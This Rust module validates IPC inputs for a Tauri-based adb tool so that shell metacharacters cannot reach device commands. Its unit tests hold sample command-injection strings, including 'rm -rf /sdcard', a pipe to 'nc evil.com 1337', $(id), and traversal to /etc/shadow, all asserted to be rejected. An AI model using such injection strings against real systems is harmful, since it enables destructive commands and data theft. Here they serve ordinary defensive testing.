//! Input validation for IPC commands.
//!
//! Every string that crosses the Tauri IPC boundary and ends up interpolated
//! into an `adb shell` command MUST pass through one of the validators in this
//! module. A compromised WebView (XSS via untrusted dumpsys output, etc.)
//! could otherwise inject shell metacharacters and execute arbitrary commands
//! on the connected Android device.
//!
//! All validators return `IpcError` so they can be propagated to the frontend
//! via `?` from any `#[tauri::command]` handler.

use crate::error::IpcError;

fn invalid(field: &str, value: &str) -> IpcError {
    IpcError {
        kind: "invalid_input".to_string(),
        message: format!("invalid {field}: {value}"),
    }
}

/// Android package name: dot-separated alphanumeric / underscore segments.
/// Matches Android's own grammar for application IDs.
pub fn validate_pkg(pkg: &str) -> Result<&str, IpcError> {
    if pkg.is_empty() || pkg.len() > 255 {
        return Err(invalid("package", pkg));
    }
    if !pkg.chars().all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '.') {
        return Err(invalid("package", pkg));
    }
    Ok(pkg)
}

/// ADB device serial: alphanumeric, dot, colon, dash, underscore.
/// Covers USB (`R3CW3...`), TCP (`192.168.1.5:5555`) and emulator (`emulator-5554`).
pub fn validate_serial(serial: &str) -> Result<&str, IpcError> {
    if serial.is_empty() || serial.len() > 128 {
        return Err(invalid("serial", serial));
    }
    if !serial
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || c == '.' || c == ':' || c == '-' || c == '_')
    {
        return Err(invalid("serial", serial));
    }
    Ok(serial)
}

/// AppOp opcode (e.g. `RUN_IN_BACKGROUND`, `SCHEDULE_EXACT_ALARM`).
pub fn validate_op_name(op: &str) -> Result<&str, IpcError> {
    if op.is_empty() || op.len() > 64 {
        return Err(invalid("op", op));
    }
    if !op.chars().all(|c| c.is_ascii_alphanumeric() || c == '_') {
        return Err(invalid("op", op));
    }
    Ok(op)
}

/// AppOp / standby bucket / appops mode token.
/// Allows lowercase letters and underscores; the actual enum is checked downstream.
pub fn validate_token(token: &str) -> Result<&str, IpcError> {
    if token.is_empty() || token.len() > 32 {
        return Err(invalid("token", token));
    }
    if !token.chars().all(|c| c.is_ascii_alphanumeric() || c == '_') {
        return Err(invalid("token", token));
    }
    Ok(token)
}

/// Decimal integer string (positive or negative).
pub fn validate_integer(value: &str) -> Result<&str, IpcError> {
    if value.is_empty() || value.len() > 20 {
        return Err(invalid("integer", value));
    }
    let bytes = value.as_bytes();
    let mut i = 0;
    if bytes[0] == b'-' || bytes[0] == b'+' {
        i = 1;
        if bytes.len() == 1 {
            return Err(invalid("integer", value));
        }
    }
    if !bytes[i..].iter().all(|b| b.is_ascii_digit()) {
        return Err(invalid("integer", value));
    }
    Ok(value)
}

/// Display density / size / refresh rate: digits, optional dot, optional `x` (for `1080x1920`).
pub fn validate_dimension(value: &str) -> Result<&str, IpcError> {
    if value.is_empty() || value.len() > 32 {
        return Err(invalid("dimension", value));
    }
    if !value.chars().all(|c| c.is_ascii_digit() || c == '.' || c == 'x') {
        return Err(invalid("dimension", value));
    }
    Ok(value)
}

/// SHA-256 hex digest: exactly 64 lowercase hex characters.
/// Used to validate snapshot IDs that map to filenames on disk.
pub fn validate_hex_id(id: &str) -> Result<&str, IpcError> {
    if id.len() != 64 {
        return Err(invalid("snapshot_id", id));
    }
    if !id.chars().all(|c| c.is_ascii_hexdigit()) {
        return Err(invalid("snapshot_id", id));
    }
    Ok(id)
}

/// Android filesystem path (absolute or relative). Forbids shell metacharacters
/// and `..` segments. Used for `pm clear`, `ls`, `rm`, etc.
pub fn validate_android_path(path: &str) -> Result<&str, IpcError> {
    if path.is_empty() || path.len() > 4096 {
        return Err(invalid("path", path));
    }
    // Reject anything that could break out of the intended arg slot.
    const FORBIDDEN: &[char] = &[
        ';', '|', '&', '$', '`', '\n', '\r', '\t', '"', '\'', '<', '>', '*', '?', '(', ')', '[', ']',
        '{', '}', '\\', '!', '#',
    ];
    if path.chars().any(|c| FORBIDDEN.contains(&c) || c.is_control()) {
        return Err(invalid("path", path));
    }
    if path.split('/').any(|seg| seg == "..") {
        return Err(invalid("path", path));
    }
    Ok(path)
}

/// Reboot mode: one of the well-known `reboot` argument values.
pub fn validate_reboot_mode(mode: &str) -> Result<&str, IpcError> {
    const MODES: &[&str] = &["", "recovery", "bootloader", "fastboot", "sideload", "edl"];
    if MODES.contains(&mode) {
        Ok(mode)
    } else {
        Err(invalid("reboot_mode", mode))
    }
}

/// Fastboot partition: lowercase letters, digits, underscore, dash.
pub fn validate_partition(part: &str) -> Result<&str, IpcError> {
    if part.is_empty() || part.len() > 64 {
        return Err(invalid("partition", part));
    }
    if !part.chars().all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-') {
        return Err(invalid("partition", part));
    }
    Ok(part)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn pkg_accepts_valid() {
        assert!(validate_pkg("com.android.systemui").is_ok());
        assert!(validate_pkg("a").is_ok());
    }

    #[test]
    fn pkg_rejects_injection() {
        assert!(validate_pkg("com.app;rm -rf /sdcard").is_err());
        assert!(validate_pkg("com.app | nc evil.com 1337").is_err());
        assert!(validate_pkg("com.app`whoami`").is_err());
        assert!(validate_pkg("com.app$(id)").is_err());
        assert!(validate_pkg("").is_err());
    }

    #[test]
    fn hex_id_rejects_path_traversal() {
        assert!(validate_hex_id("../../etc/passwd").is_err());
        // 64 chars but not hex
        assert!(validate_hex_id(&"z".repeat(64)).is_err());
        // valid 64-char hex
        assert!(validate_hex_id(&"0".repeat(64)).is_ok());
    }

    #[test]
    fn path_rejects_traversal_and_metachars() {
        assert!(validate_android_path("/sdcard/screen.png").is_ok());
        assert!(validate_android_path("../../../etc/shadow").is_err());
        assert!(validate_android_path("/sdcard/foo;rm").is_err());
        assert!(validate_android_path("/sdcard/$(cat /etc/hosts)").is_err());
    }

    #[test]
    fn serial_accepts_common_shapes() {
        assert!(validate_serial("R3CW304XYZ").is_ok());
        assert!(validate_serial("192.168.1.5:5555").is_ok());
        assert!(validate_serial("emulator-5554").is_ok());
        assert!(validate_serial("evil; ls").is_err());
    }
}
